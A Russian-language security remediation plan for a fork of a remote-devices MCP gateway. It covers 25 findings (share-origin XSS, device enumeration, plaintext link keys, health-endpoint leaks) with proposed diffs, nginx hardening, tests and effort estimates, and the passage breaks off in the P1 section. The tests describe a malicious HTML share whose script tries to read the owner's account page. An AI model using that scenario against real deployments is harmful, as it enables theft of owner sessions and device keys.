# План исправлений уязвимостей форка `nicelight/remote-devices-mcp`

**Дата:** 2026-11-19
**Объект:** форк `nicelight/remote-devices-mcp` @ `2bbc9a0` (база `LevRa7/remote-harness-mcp` 0.4.8), рабочая копия `D:\tmp-rdmcp` (только чтение)
**Источник находок:** [VULN_REPORT_fork.md](VULN_REPORT_fork.md) — F-01…F-25
**Архитектурный контекст:** [ARCH_admin_cannot_access_users.md](ARCH_admin_cannot_access_users.md)
**Смежные документы:** [SECURITY_FORK_ASSESSMENT.md](SECURITY_FORK_ASSESSMENT.md)

Документ описывает **что менять, где именно, как проверять и в каком порядке выкатывать**. Код форка в рамках
этой задачи не изменяется: все фрагменты «до/после» — предложения, а не применённые правки.

---

## 0. Как проверялись ссылки на строки

Каждая ссылка `file:line` из отчёта перепроверена по коду `D:\tmp-rdmcp` (нумерация — по файлу на момент
`2bbc9a0`). Обнаруженные расхождения (в плане ниже используются **фактические** номера):

| Находка | В отчёте | Фактически | Комментарий |
| :--- | :--- | :--- | :--- |
| F-03, F-24 | `gateway.py:671` | `gateway.py:668` | `"instance_id": INSTANCE_ID` — строка 668; 671 — это `active_tunnels_count` |
| F-01 | `core/web_share.py` (`handle_http_request`) | `core/web_share.py:488-563` | функция `handle_http_request`, заголовки фильтруются по `_KEEP_HEADERS` (98-106) |
| F-08 | `gateway.py:949-957` | `gateway.py:912-913` (`PAIR_TTL_SECONDS`, `PAIR_MAX_PENDING`), `941-954` (`device_pair_start`) | константы объявлены выше обработчика |
| F-09 | `gateway.py:1157`, `1179` | подтверждено (`request_credential` в `device_rotate_token_finish` и `device_revoke`) | — |
| F-10 | `core/web_share.py:567-585` | `core/web_share.py:570-585` | `def share_file` начинается на 570, проверки пути — 572-585 |
| F-14 | `gateway.py:3597` | `gateway.py:3596-3597` | `uvicorn.run(..., ws_max_size=128 * 1024 * 1024)` |
| F-16 | `gateway.py:2831-2832` | подтверждено | проверка `location.startswith("/")` |
| F-22 | `core/redact.py:24,43,62` | подтверждено | 24 — `_NOT_A_SECRET`, 43 — квантификатор `{8,}`, 62 — `_mask` |
| F-05 | `core/mcp_tools.py:1847`, `2553` | подтверждено | плюс `_write_guard` на 428-434, комментарий-контракт на 864 |

Остальные ссылки отчёта совпали.

---

## 1. Сводная таблица

Оценки — в часах чистой работы одного инженера, включая тесты и правку документации; «пд» = 8 ч.
Риск регрессии: **low** — локальная правка с покрытием, **med** — меняется наблюдаемое поведение/формат,
**high** — меняется контракт с внешними клиентами или формат хранилища.

| ID | Sev | Суть исправления (одной строкой) | Файлы (:line) | Оценка | Регрессия | Порядок |
| :--- | :--- | :--- | :--- | ---: | :---: | :---: |
| F-01 | critical | CSP `sandbox` + `nosniff` + `attachment` на всех relay-ответах шар, затем вынос шар на отдельный origin | `gateway.py:2813-2834`, `3448-3462`, `1264-1266`, `3465-3506`; `core/web_share.py:98-106`, `344-401`, `548` | 8 ч (а) / +24–32 ч (б) | med | P0 |
| F-02 | high | Единый `401 {"error":"unauthorized"}`, убрать `suggested_username`, одинаковый `404` для неизвестного/офлайн узла | `gateway.py:507-543`, `431-441`, `834-842`, `3417-3418`, `3427-3428` | 6 ч | med | P0 |
| F-03 | medium | Приватный `/health` по умолчанию; полная диагностика — только по credential; убрать hostname/PID | `gateway.py:655-684` | 4 ч | low | P0 |
| F-04 | high | `link_key_sha256` вместо plaintext, однократная выдача ключа, `0600` на registry | `gateway.py:402-405`, `701-718`, `884`, `1064`, `317-330`; `gateway_identity.py:188-195` | 16 ч | high | P1 |
| F-05 | medium | `_READ_ONLY` реально блокирует `bash_exec`/`run_job` (плюс argv-allowlist для наблюдения) | `core/mcp_tools.py:1847-1855`, `2553-2560`, `428-434`, `864`, `2854-2855`; `gateway.py:2854-2855` | 6 ч | med | P1 |
| F-06 | medium | Allowlist владельцев (`sub`/`hd`) + привязка approve к инициатору (bind через фрагмент URL) | `gateway.py:1236-1251`; `gateway_identity.py:147-167`; `docs/GOOGLE_OWNER_ONBOARDING.md:109` | 14 ч | med | P1 |
| F-07 | medium | Доверенный IP (только от прокси), лимиты на подсеть, очистка окна | `gateway.py:747-751`, `754-771`; `ops/nginx/remote-harness-mcp.conf:85,102,119,135,150` | 8 ч | med | P1 |
| F-08 | medium | Квота на источник + вытеснение старейшей заявки + `Retry-After` | `gateway.py:941-954`, `926-931` | 3 ч | low | P1 |
| F-09 | medium | Сброс `allow_legacy_query` при ротации; `source == "header"` для state-changing | `gateway.py:533-535`, `1084-1094`, `1121`, `1157`, `1179` | 4 ч | high | P1 |
| F-10 | medium | Запрет конфиг-каталога/`.env` в `share_file`/`serve_dir` | `core/web_share.py:570-585`, `642-656`, `330-337` | 3 ч | low | P1 |
| F-11 | medium | Подпись payload (minisign) + проверка в установщике до импорта; публикация SHA-256 | `gateway.py:1319-1344`; `install.sh:957-973`; `install.ps1:823-875` | 16 ч | high | P2 |
| F-12 | medium | `execFile`/массив аргументов вместо `bash -c` и `[scriptblock]::Create` | `bin/cli.js:93-115` | 3 ч | med | P2 |
| F-13 | medium | Standalone: токен обязателен, проверка `Origin`/`Host`, `Content-Type`, лимит тела | `core/server.py:707-710`, `751-779`, `840-864`, `903-918`, `963-967` | 8 ч | high | P2 |
| F-14 | medium | Квоты relay: семафор, лимит байт на шлюзе, снижение `ws_max_size` | `gateway.py:3441`, `3592-3597`; `core/web_share.py:85-88`, `532-546` | 8 ч | med | P2 |
| F-15 | medium | `shlex` + запрет метасимволов + сверка `argv[0]` с whitelist | `core/policies.py:38-52`, `94-98`, `116-133` | 6 ч | med | P2 |
| F-16 | low | Отклонять `//` и `/\` в `Location` | `gateway.py:2831-2832` | 2 ч | low | P2 |
| F-17 | low | `MESH_REGISTER_MODE` fail-closed: неизвестное значение = запрет регистрации | `gateway.py:721`, `725-744`, `732` | 2 ч | med | P2 |
| F-18 | low | Второй фактор админа на rotate/revoke; админский rotate не отдаёт рабочий ключ | `gateway.py:915`, `921-923`, `1074-1143` | 8 ч | high | P2 |
| F-19 | low | Убрать `await` между проверкой `approved` и `approve_pair` | `gateway.py:1015-1038` | 2 ч | low | P2 |
| F-20 | low | Верхняя граница `username` (40 симв.) и в `unique_node_name` | `gateway.py:791-794`, `692-698`, `1043` | 2 ч | low | P2 |
| F-21 | low | Ограниченный размер `_rate_windows` + вытеснение истёкших | `gateway.py:754-771` | 2 ч | low | P2 |
| F-22 | low | Редакция коротких и `$`-значений без ломки ссылок на переменные | `core/redact.py:24`, `40-45`, `59-64` | 3 ч | med | P2 |
| F-23 | low | `resource` из `PUBLIC_BASE_URL`, `Cache-Control: no-store` | `gateway.py:1347-1372` | 2 ч | low | P2 |
| F-24 | info | Убрать `hostname:pid` из публичного `instance_id` | `gateway.py:66`, `668` | 1 ч | low | P2 |
| F-25 | info | Ограничить перевыдачу ключей (`collected` + окно повтора) | `gateway.py:985-1012` | 2 ч | med | P2 |

**Итоги по разделам**

| Раздел | Находки | Часы | пд |
| :--- | :--- | ---: | ---: |
| §3 P0 (hotfix) | F-01(a), F-02, F-03 | **18 ч** | 2,3 |
| §3 P0 (F-01 вариант «б», отдельный origin) | F-01(b) | **+24…32 ч** | +3…4 |
| §4 P1 | F-04…F-10 (7 находок) | **54 ч** | 6,8 |
| §5 P2 | F-11…F-25 (15 находок) | **67 ч** | 8,4 |
| **Всего (F-01 закрывается вариантом «а»)** | 25 находок | **139 ч** | **17,4** |
| **Всего (с F-01(б))** | 25 находок | **163…171 ч** | **20,4…21,4** |

P0: **3** находки · P1: **7** находок · P2: **15** находок (включая 2 info-наблюдения).

---

## 2. Немедленные меры без изменения кода (день 0)

Всё ниже делается конфигурацией/эксплуатацией и не требует пересборки шлюза. Меры **снижают** риск, но не
закрывают причины — это явно указано.

### 2.1. Env/настройки шлюза

| Мера | Команда/файл | Что закрывает | Чего не закрывает |
| :--- | :--- | :--- | :--- |
| `MESH_PRIVATE_HEALTH=1` | `ops/systemd/gateway.env.example:9` (там уже есть), либо `Environment=` в `ops/systemd/rhm-gateway.service` | F-03 полностью, F-24 (в приватной ветке `gateway.py:658-661` отдаётся только `{"status":"healthy"}`), канал перечисления из F-02 | перечисление через `/sse?user=` и `/api/register` (F-02) остаётся |
| `MESH_REGISTER_MODE=pair` | `gateway.env.example:6` | F-17 (явно), а также `409 suggested_username` из F-02 — при `pair` регистрация отвечает `410` (`gateway.py:732-736`) | пул заявок привязки (F-08) и захват заявки (F-06) |
| `MESH_ENROLL_SECRET=<random>` | `gateway.env.example:7` | саморегистрацию без секрета, если режим `open` | подбор (секрет один, общий) |
| `MESH_LEGACY_SUBDOMAIN=0` | `gateway.env.example:10` | legacy-резолв узла по поддомену (`gateway.py:457-468`) | — |
| `MESH_GOOGLE_CLIENT_ID/SECRET` + **OAuth consent screen = Internal** (Google Workspace) | `gateway.env.example:15-16` | F-06 частично: войти в `/account` сможет только аккаунт вашего домена, «любой Google-аккаунт» перестаёт быть таковым | остаётся захват заявки вторым пользователем того же домена; allowlist в коде всё равно нужен |
| `MESH_ADMIN_TOKEN` ≥ 32 байта, отдельный от `MESH_ENROLL_SECRET` | `gateway.env.example:8` | подбор админ-ключа | F-18 (один фактор, выдача рабочих ключей) |

### 2.2. Прокси (nginx): 10 минут работы

1. **F-07, частично:** заменить `$proxy_add_x_forwarded_for` на `$remote_addr` в пяти местах
   (`ops/nginx/remote-harness-mcp.conf:85,102,119,135,150`). Тогда клиентский `X-Forwarded-For` не попадает
   первым, и `client_ip()` (`gateway.py:747-751`) перестаёт быть обходимым. Для Caddy (документированный
   фронт) это уже так по умолчанию — там обход не работал.
2. **F-01, сдерживание:** отдельный regex-location для шар с принудительными заголовками. Slug-шаблон
   (`<name>-<16 hex>`) не пересекается с `/mcp`, `/sse`, `/messages`, `/health`, `/ws/tunnel`,
   `/api/register`, `/.well-known/...`, поэтому location безопасен:

   ```nginx
   # Только публичные шары: второй сегмент заканчивается на -<16 hex>.
   location ~ "^/[A-Za-z0-9_.-]+/[a-z0-9][a-z0-9_-]{0,63}-[0-9a-f]{16}(/|$)" {
       proxy_pass http://127.0.0.1:8096;
       proxy_http_version 1.1;
       proxy_set_header Host $host;
       proxy_hide_header Set-Cookie;
       add_header Content-Security-Policy "sandbox; default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'" always;
       add_header X-Content-Type-Options "nosniff" always;
       add_header Content-Disposition "attachment" always;
       add_header Referrer-Policy "no-referrer" always;
   }
   ```

   Это **не** исправление: origin остаётся тем же, а заголовок может быть потерян при смене прокси. Это
   выигрыш времени до §3.
3. **F-02/F-08, сдерживание:** завести `limit_req_zone` для `/sse`, `/v1/devices/pair`, `/v1/devices/pair/`
   (сейчас зона есть только для `/api/register`, строка 145) и `limit_req` с `burst` — грубый, но
   работающий барьер против перечисления и забивания пула заявок.
4. **F-10, сдерживание:** если шары не нужны — отключить их на прокси (`return 404` в location выше) или
   на узлах через `MESH_READ_ONLY=1` (тогда `share_file`/`serve_dir` отказывают: `core/mcp_tools.py:2878-2889`).

### 2.3. Узлы и гигиена секретов

| Мера | Что закрывает | Чего не закрывает |
| :--- | :--- | :--- |
| `chmod 600 registry.json`, владелец — сервисный пользователь, каталог не в web-root, `MESH_REGISTRY_PATH` на отдельном томе | F-04 (доступ «случайных» читателей) | plaintext `link_key` в файле — остаётся (нужен §4/F-04) |
| Шифрование бэкапов registry, запрет копирования в git/облако | F-04 при утечке бэкапа | то же |
| `MESH_WEB_LISTING=0` на узлах | облегчает перечисление содержимого шар | публикация HTML остаётся возможной |
| Не запускать `core/server.py` с `--host 0.0.0.0` и без `--token` (`core/server.py:963-967` — только предупреждение) | F-13 в сетевом варианте | CSRF/DNS-rebinding на loopback при пустом токене остаётся |
| В документации заменить `curl … \| bash -s -- <args>` на `curl -o /tmp/i.sh && sh /tmp/i.sh` | F-12 (пользовательские значения больше не идут через shell) | сам `bin/cli.js` не меняется |
| Проверять `sha256` установщика по релизным заметкам GitHub, ставить из git-чекаута, а не с домена | F-11 (обнаружение подмены) | автоматической проверки нет — нужен §5/F-11 |

### 2.4. Что этими мерами **не** закрывается принципиально

- **F-01** — причина (шара на origin кабинета) остаётся; любой обход прокси-заголовков возвращает XSS.
- **F-02** — остаются `401` «User '…' is not registered» и `503/404` шар.
- **F-04** — plaintext в registry.
- **F-05** — `MESH_READ_ONLY` по-прежнему обходится `bash_exec` (единственный честный способ сегодня —
  не выдавать узлу доступ с `access=read_only`, а ограничивать ОС-пользователя).
- **F-08, F-09, F-14, F-15, F-18, F-19, F-21, F-22** — только код.

---

## 3. P0 — hotfix (F-01, F-02, F-03)

Ветка `hotfix/p0`, три независимых коммита. Суммарно **18 ч** (+24…32 ч на вариант «б» для F-01).

### 3.1. F-01. Шары на origin кабинета → XSS и угон `link_key`

**Точное место:** `gateway.py:2813-2816` (`_RELAY_HEADERS`), `2821-2834` (`_relay_headers`), `3448` (применение),
`3462` (формирование ответа), `3411-3428` (`public_share_endpoint`), `1264-1266` (рендер `link_key` в HTML
кабинета). На узле заголовки безопасности не ставятся вообще: `core/web_share.py:98-106` (`_KEEP_HEADERS`),
`344-401` (`_ShareHandler`), `548` (фильтрация заголовков ответа). CSP кабинета есть только на страницах
`gateway_identity.page()` — `gateway_identity.py:51-55`.

#### Вариант (а) — минимальный: заголовки на relay-ответах

Правка 1 — новые константы и обёртка рядом с `_relay_headers` (`gateway.py:2813-2834`):

```python
# было (gateway.py:2813-2816)
_RELAY_HEADERS = (
    "content-type", "content-disposition", "last-modified", "etag",
    "cache-control", "location", "accept-ranges", "content-length",
)
```

```python
# стало
_RELAY_HEADERS = (
    "content-type", "content-disposition", "last-modified", "etag",
    "cache-control", "location", "accept-ranges", "content-length",
)
# Шара - это чужой HTML на нашем origin. Заголовки безопасности ставит ШЛЮЗ,
# а не узел: значение из ответа узла не переносится никогда.
_SHARE_CSP = ("sandbox; default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; "
              "frame-ancestors 'none'; base-uri 'none'; form-action 'none'")
_SHARE_ACTIVE_TYPES = (
    "text/html", "application/xhtml+xml", "image/svg+xml", "text/xml", "application/xml",
)

def _share_security_headers(headers: dict) -> dict:
    out = dict(headers)
    mime = (out.get("content-type") or "").split(";")[0].strip().lower()
    out["content-security-policy"] = _SHARE_CSP
    out["x-content-type-options"] = "nosniff"
    out["referrer-policy"] = "no-referrer"
    out["cross-origin-opener-policy"] = "same-origin"
    if mime in _SHARE_ACTIVE_TYPES:
        # Активный контент отдаётся только как загрузка: без filename из узла,
        # чтобы не-ASCII имя не сломало latin-1-кодирование заголовков в Starlette.
        out["content-type"] = "application/octet-stream"
        out["content-disposition"] = 'attachment; filename="share"'
        out.pop("location", None)
    return out
```

Правка 2 — применение (`gateway.py:3448`):

```python
# было
    headers = _relay_headers(result.get("headers"))
# стало
    headers = _share_security_headers(_relay_headers(result.get("headers")))
```

Правка 3 — не рендерить `link_key` в HTML кабинета (`gateway.py:1264-1266`). Сейчас ключ всех устройств
владельца лежит в разметке страницы, поэтому любой same-origin скрипт читает его без запросов:

```python
# было (gateway.py:1264-1266)
link = PUBLIC_BASE_URL + '/mcp?' + urlencode({'user': user, 'token': entry['link_key']})
content += f'<article class="device">…'
content += f'<textarea id="url-{escape(user)}" …>{escape(link)}</textarea>'
```

```python
# стало: только плейсхолдер; ключ отдаётся по кнопке, отдельным запросом
content += f'<textarea id="url-{escape(user)}" rows="3" readonly spellcheck="false" ' \
           f'data-device="{escape(user)}" placeholder="Нажмите «Показать ссылку»"></textarea>'
content += f'<button class="secondary reveal" data-target="url-{escape(user)}">Показать ссылку</button>'
```

и новый обработчик + маршрут (рядом с `owner_device_action`, `gateway.py:1280`, маршруты — блок `3465-3506`):

```python
async def owner_device_link(request: Request):
    """Выдать Server URL одного устройства. Ключ не попадает в разметку страницы."""
    owner = owner_auth.owner(request)
    data = await fields(request)
    if not owner_auth.csrf_ok(request, owner, data):
        return JSONResponse({'error': 'forbidden'}, status_code=403,
                            headers={'Cache-Control': 'no-store'})
    if rate_limited('owner_link', f"{client_ip(request)}|{owner['subject']}", limit=30):
        return JSONResponse({'error': 'rate_limited'}, status_code=429,
                            headers={'Cache-Control': 'no-store'})
    entry = load_registry().get(request.path_params['user'])
    if not entry or entry.get('owner_subject') != owner['subject']:
        return JSONResponse({'error': 'not_found'}, status_code=404)
    url = PUBLIC_BASE_URL + '/mcp?' + urlencode({'user': request.path_params['user'],
                                                 'token': entry['link_key']})
    return JSONResponse({'url': url}, headers={'Cache-Control': 'no-store'})
```

```python
Route('/account/devices/{user}/link', owner_device_link, methods=['POST']),
```

JS на странице — один `fetch` c `credentials: 'include'` и CSRF-полем из формы; конкретная реализация
укладывается в существующий `script`-параметр `page()` (`gateway.py:1273-1277`).

**Тесты (новые, `tests/test_gateway_share_route.py`):**

| Имя | Что проверяет |
| :--- | :--- |
| `test_every_relayed_share_response_carries_a_sandbox_csp` | для набора MIME (`text/html`, `image/svg+xml`, `text/plain`, `application/pdf`) в ответе есть `content-security-policy` с `sandbox` и `frame-ancestors 'none'`, `x-content-type-options: nosniff` |
| `test_active_content_from_a_share_is_downloaded_not_rendered` | при `content-type: text/html` в ответе `content-type: application/octet-stream` и `content-disposition: attachment`; `location` отброшен |
| `test_a_node_cannot_override_the_share_security_headers` | узел присылает свой `content-security-policy: default-src *` и `x-content-type-options: ""` → в ответе значения шлюза, а не узла |
| `test_two_tenants_one_share_link_and_no_session_leak` | фикстура `two_tenants` (новая): `alice` и `bob` в registry, шара `alice` отдаёт HTML с `<script>` и попыткой `fetch('/account')`; проверяем, что ответ шары не содержит `__Host-rhm-owner`, не содержит `lk_`, и что `/account` под сессией `bob` по-прежнему отдаёт CSP с nonce, а не содержимое шары |
| `test_the_account_page_never_embeds_a_link_key` | `_asgi('GET', '/account')` со стабом сессии (новая фикстура `stub_owner_session`: `monkeypatch.setattr(gateway.owner_auth, 'owner', lambda r: {...})`) → в теле нет `lk_`; `POST /account/devices/<u>/link` с CSRF отдаёт URL и `Cache-Control: no-store` |

**Критерий приёмки:**
```bash
curl -sSI "https://<gw>/<node>/<slug>/evil.html" | grep -Ei 'content-security-policy|content-type|content-disposition|x-content-type-options'
# ожидается: CSP с sandbox, application/octet-stream, attachment; старого text/html нет
pytest -q tests/test_gateway_share_route.py tests/test_web_share.py
```
Плюс ручная проверка: открыть ссылку на HTML-шару в браузере — файл скачивается, страница не исполняется;
`document.cookie` из консоли на скачанной странице не существует.

#### Вариант (б) — правильный: отдельный origin для шар

**Почему (б) надёжнее.** Вариант (а) защищает *ответ* шары, но не устраняет причину: шара и `/account`
по-прежнему один origin, а значит одна cookie-область, один `localStorage`, один `document.domain`. Любой из
следующих сценариев возвращает XSS при (а) и не возвращает при (б):

1. **Регрессия заголовков.** Один забытый путь (новый маршрут, `StreamingResponse` в обход
   `_share_security_headers`, кэширующий прокси, который срезал `add_header`) — и HTML снова рендерится.
   В (б) цена такой регрессии — «шара открылась как страница», но `__Host-rhm-owner` физически не
   отправляется на другой хост: cookie-host-only, префикс `__Host-` (`gateway_identity.py:73`) запрещает
   `Domain`.
2. **Браузеры/движки, игнорирующие `sandbox`** (старые WebView, встроенные браузеры Android — а Termux-ветка
   в проекте есть) или политики, снимающие CSP.
3. **Credentialed-запросы.** В (б) `fetch('https://<gw>/account', {credentials:'include'})` со страницы шары
   — межсайтовый запрос; `Access-Control-Allow-Origin: *` (`gateway.py:3508-3516`) несовместим с
   `credentials: include`, чтение ответа блокируется браузером. В (а) это same-origin запрос.
4. **Будущие same-origin фичи** (новые заголовки кэша, `window.name`, service worker на `/`) перестают быть
   вектором для шар.
5. **Побочные выгоды:** шар можно отдать через CDN/отдельный лимит, отключить на нём cookie целиком,
   независимо ротировать TLS, применять свою WAF-политику.

**Что нужно для миграции (24…32 ч):**

| Шаг | Файл/артефакт | Оценка |
| :--- | :--- | ---: |
| Новая настройка `MESH_SHARE_URL` (например `https://share.example.com`), резолвер `share_base_url()` c fallback на `public_base_url()`; на узле — `core/domain.py` (рядом с `public_url`, `core/domain.py:225`) и `core/web_share.py:206` (`_public_url`) | `gateway.py`, `core/domain.py`, `core/web_share.py` | 4 ч |
| `public_share_endpoint` обслуживает только share-хост: `if request.headers.get('host','').split(':')[0].lower() != SHARE_HOST: return _share_response(404, 'not found')` | `gateway.py:3411-3418` | 2 ч |
| Отдельное приложение `share_app` (только `/{user}/{rest:path}` + `/health`) и его запуск: либо второй `uvicorn.Server` в `lifespan` (`gateway.py:3558-3585`), либо аргумент `--share-port` (сейчас `gateway.py:3591-3597` без argparse) | `gateway.py` | 6 ч |
| `ops/nginx`: `server_name share.example.com` → `proxy_pass 127.0.0.1:8097`, `proxy_hide_header Set-Cookie`; Caddy-шаблон аналогично (`ops/systemd/Caddyfile.example`) | `ops/nginx/remote-harness-mcp.conf` | 3 ч |
| DNS + TLS для share-хоста, инструкция в `docs/SELF_HOSTED_GATEWAY_RU.md` | документация/ops | 3 ч |
| Переходный режим `MESH_SHARE_LEGACY_ORIGIN=1` (старые ссылки живут N недель, но **с заголовками из (а)**), затем выключение | `gateway.py` | 4 ч |
| Тесты: `test_the_share_route_answers_only_on_the_share_origin`, обновить `tests/test_web_share.py::test_share_link_takes_its_domain_from_the_environment` и `test_gateway_share_route.py` (все запросы получают `host` share-хоста) | `tests/*` | 6 ч |

**Порядок:** (а) выкатывается сразу (8 ч) и является предусловием для любого другого варианта; (б) —
отдельным релизом, при этом (а) остаётся навсегда как второй слой (defense in depth).

### 3.2. F-02. Перечисление устройств без аутентификации

**Точное место:** `gateway.py:507-543` (`verify_token`, текст на 517), `431-441` (`credential_denial`),
`834-842` (409 с `suggested_username`), `3417-3418` и `3427-3428` (404 против 503 у шар).

Правка 1 — единый ответ на любую неудачу аутентификации (новый хелпер рядом с `verify_token`):

```python
# было (gateway.py:516-517 и 1374-1381)
    if not entry:
        return False, f"User '{user}' is not registered.", user
...
        return JSONResponse({"error": "unauthorized", "message": msg}, status_code=401, ...)
```

```python
# стало
def unauthorized_response() -> JSONResponse:
    """Один и тот же ответ на «нет такого узла», «нет токена» и «токен неверный»."""
    return JSONResponse({"error": "unauthorized"}, status_code=401,
                        headers={"Access-Control-Allow-Origin": "*", "Cache-Control": "no-store"})

# в verify_token: подробности - только в лог
    if not entry:
        logger.info("auth: unknown node requested (name withheld from the client)")
        return False, "unauthorized", user
```

Все места, отдающие `{"error":"unauthorized","message": msg}`, заменяются на `unauthorized_response()`
(`gateway.py:1374-1381`, `2619-2629` и аналогичные ветки), а `msg` уходит в `logger`. Поле `message`
удаляется из тела — клиенты (Gemini/ChatGPT/установщик) его не парсят; `onboarding.py:182` реагирует на
коды `404/410`, не на текст.

Правка 2 — убрать `suggested_username` из 409 (`gateway.py:834-842`). Ветка `auto_suffix` (843-844)
сохраняется: имя предлагает сервер только тому, кто **попросил** суффикс, и в ответе 200, а не в отказе.

Правка 3 — одинаковый ответ у шар для «нет узла» и «узел офлайн» (`gateway.py:3417-3418` против
`3427-3428`):

```python
# было
    if user not in load_registry():
        return _share_response(404, "not found")
...
    if user not in active_tunnels:
        return _share_response(503, "node offline: the mesh agent on '%s' is not connected" % user)
```

```python
# стало
    if user not in load_registry():
        return _share_response(404, "not found")
...
    if user not in active_tunnels:
        # Разный ответ на «нет узла» и «узел офлайн» - это оракул перечисления.
        # Диагностика остаётся в логе; владелец видит состояние в /account («Проверить связь»).
        logger.info("share relay: node '%s' is offline (client told nothing)", user)
        return _share_response(404, "not found")
```

**Тесты (`tests/test_gateway_credentials.py`, `tests/test_gateway_share_route.py`):**

| Имя | Что проверяет |
| :--- | :--- |
| `test_unknown_node_and_a_wrong_token_answer_the_same_401` | тела и заголовки ответов для `?user=ghost` и `?user=alice&token=wrong` побайтово равны; ни в одном нет имени узла |
| `test_no_endpoint_reveals_whether_a_name_exists` | параметризованно: `/sse`, `/mcp`, `/messages` (GET/POST/DELETE), `/api/register`, `/health`, `/<user>/<slug>/` → для существующего и несуществующего узла одинаковый код и тело |
| `test_re_registration_by_mac_and_name_alone_is_refused` (**изменить**, сейчас `test_gateway_credentials.py:111-117`) | убрать `assert "suggested_username" in attempt`, добавить `assert attempt == {"error": "conflict", "message": ...}` без имени |
| `test_an_offline_node_fails_fast_with_503` (**переименовать** → `test_an_offline_node_is_indistinguishable_from_an_unknown_one`, `test_gateway_share_route.py:510-520`) | `404` и `b"not found\n"`, `fake.calls == []` |
| `test_the_share_route_rate_limits_anonymous_enumeration` | N+1 запросов с одного IP → `429` (использует новый лимит на bucket `share`) |

**Критерий приёмки:**
```bash
a=$(curl -s -o /dev/null -w '%{http_code} %{size_download}' "https://<gw>/sse?user=ghost&token=x")
b=$(curl -s -o /dev/null -w '%{http_code} %{size_download}' "https://<gw>/sse?user=alice&token=wrong")
[ "$a" = "$b" ] && echo OK        # оба 401, одинаковый размер тела
curl -s "https://<gw>/alice/share-0123456789abcdef/" | grep -c alice   # 0
```

### 3.3. F-03. `/health` раскрывает имена и диагностику

**Точное место:** `gateway.py:655-684`; флаг читается в `658`, поля — `668` (`instance_id`), `678`
(`streams_per_user`), `683` (`tunnel_events`). Флаг выставлен в примере (`ops/systemd/gateway.env.example:9`),
но в минимальном `gateway.env` из `docs/GOOGLE_OWNER_ONBOARDING.md` его нет, а в коде default-open.

```python
# было (gateway.py:658-684)
    if os.environ.get("MESH_PRIVATE_HEALTH") == "1":
        authorised, _, _ = verify_token(request)
        if not authorised and not admin_authorised(request):
            return JSONResponse({"status": "healthy"})
    ...
    return JSONResponse({ ... "instance_id": INSTANCE_ID, "target_user": user, ...,
                          "streams_per_user": {...}, "tunnel_events": list(tunnel_events) }, ...)
```

```python
# стало
def _public_health_forced() -> bool:
    """MESH_PRIVATE_HEALTH=0 - явный опт-ин на публичную диагностику (для отладки)."""
    return os.environ.get("MESH_PRIVATE_HEALTH", "1").strip() == "0"

async def health(request: Request):
    ...
    authorised, _, _ = verify_token(request)
    if not authorised and not admin_authorised(request):
        return JSONResponse({"status": "healthy"},
                            headers={"Access-Control-Allow-Origin": "*",
                                     "Cache-Control": "no-store"})
    if not _public_health_forced():
        # Авторизованный вызов тоже не отдаёт имена всех арендаторов:
        # только своё состояние.
        return JSONResponse({"status": "healthy",
                             "service": "remote_harness_mcp_gateway",
                             "node_online": user in active_tunnels if user != "anonymous" else False,
                             "instance_id": INSTANCE_ID}, headers=...)
```

Отдельно: `instance_id` перестаёт быть `hostname:pid:random` (`gateway.py:66`) — см. §5/F-24; в публичной
ветке он не отдаётся вовсе.

**Тесты (`tests/test_gateway_resilience.py`):**

| Имя | Что проверяет |
| :--- | :--- |
| `test_health_hides_names_and_diagnostics_by_default` | без env: в теле нет `streams_per_user`, `tunnel_events`, `target_user`, `instance_id`, hostname; ключи ровно `{"status"}` |
| `test_health_reports_diagnostics_only_to_a_credentialed_caller` | с валидным `Authorization: Bearer <device token>` — только свои поля; список узлов отсутствует |
| `test_health_reports_last_tunnel_seen_and_tunnel_events` (**изменить**, сейчас `test_gateway_resilience.py:233-248`) | добавить в начало `monkeypatch.setenv("MESH_PRIVATE_HEALTH", "0")` (новая фикстура `public_health` с `setenv`/`delenv`) |
| `test_health_never_leaks_the_hostname` | в теле нет `socket.gethostname()` и `os.getpid()` |

**Критерий приёмки:**
```bash
curl -s https://<gw>/health                          # {"status":"healthy"}
curl -s "https://<gw>/health?user=alice&token=<lk>"  # только своё состояние, без списков
pytest -q tests/test_gateway_resilience.py tests/test_gateway_share_route.py::test_health_and_mcp_still_answer_through_the_app
```

---

## 4. P1 — F-04…F-10 (54 ч)

### 4.1. F-04. `link_key` открытым текстом

**Место:** `gateway.py:701-718` (`new_node_entry`, ключ — строка 710), `402-405` (`token_matches_link`),
`884` (ответ регистрации), `1064` (выдача при привязке), `1100` (ротация), `317-330` (`save_registry` — права
файла). `token_sha256` хэшируется, `link_key` — нет.

```python
# было (gateway.py:708-718)
    return {
        "token_sha256": hash_secret(token),
        "link_key": new_link_key(),
        ...
# стало
def new_node_entry(mac, os_name, arch, now_iso, token, link_key=None):
    entry = {
        "token_sha256": hash_secret(token),
        "link_key_sha256": hash_secret(link_key or new_link_key()),
        ...
    }
```
```python
# было (gateway.py:402-405)
def token_matches_link(entry: dict, token: str) -> bool:
    stored = entry.get("link_key") or ""
    return bool(stored) and bool(token) and tokens_equal(token, stored)

# стало
def token_matches_link(entry: dict, token: str) -> bool:
    stored = str(entry.get("link_key_sha256") or "")
    if stored:
        return bool(token) and tokens_equal(hash_secret(token), stored)
    legacy = entry.get("link_key") or ""          # запись до миграции
    return bool(legacy) and bool(token) and tokens_equal(token, legacy)
```

Миграция (в `load_registry`, `gateway.py:307-315`): если есть `link_key` и нет `link_key_sha256` — записать
хэш. **Важно:** plaintext после этого теряется, показать прежнюю ссылку нельзя, поэтому миграция обязана
сопровождаться UX-шагом: в `/account` для таких устройств кнопка «Заменить ссылку» помечается как
обязательная («прежняя ссылка больше не отображается — выпустите новую»), а `device_rotate` возвращает новый
ключ **один раз** (и он же уходит в `sse_url`). Права файла: в `save_registry` после `os.replace`
(`gateway.py:317-330`) — `os.chmod(path, 0o600)`.

**Совместимость:** формат registry становится несовместимым с обратным откатом (старый код не прочитает
`link_key`) → откат только из бэкапа registry (см. §7). Внешние клиенты не затронуты: URL не меняется.
**Тесты (`tests/test_gateway_credentials.py`):** `test_the_link_key_is_never_stored_in_plaintext` (после
регистрации в файле нет `lk_`, есть `link_key_sha256 == hash_secret(issued)`),
`test_a_link_key_is_accepted_and_a_twin_is_not` (`lk_…` проходит, изменённый последний символ — нет),
`test_a_legacy_registry_entry_is_migrated_on_load` (запись с `link_key` → после `load_registry` есть только
хэш), `test_registry_file_is_0600` (`stat.S_IMODE` == 0o600; на Windows — `pytest.mark.skipif`),
